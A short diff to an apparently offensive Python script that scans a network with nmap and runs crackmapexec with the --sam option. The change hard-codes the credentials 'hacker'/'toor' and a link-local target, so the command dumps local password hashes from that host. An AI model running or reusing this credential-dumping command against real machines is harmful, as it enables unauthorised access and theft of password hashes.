@@ -2,6 +2,7 @@ import nmap
 import re
 import sys
 import subprocess
+import shlex
 
 def convertIpToRange(ip):
 	rgx = re.compile(r'\b\d{1,3}\.\d{1,3}\.\d{1,3}\.')
@@ -31,7 +32,8 @@ def nmScan(ip):
     return targets
 
 def firstMachine(username, password, ip):
-    proc = subprocess.Popen('crackmapexec -u {} -p {} -d WORKGROUP {} --sam'.format(username, password, ip), stdout=subprocess.PIPE)
+    args = shlex.split('/usr/bin/crackmapexec -u hacker -p toor -d WORKGROUP 169.254.121.23 --sam')
+    proc = subprocess.Popen(args, stdout=subprocess.PIPE)
     tmp = proc.stdout.read()
     print(tmp)
 
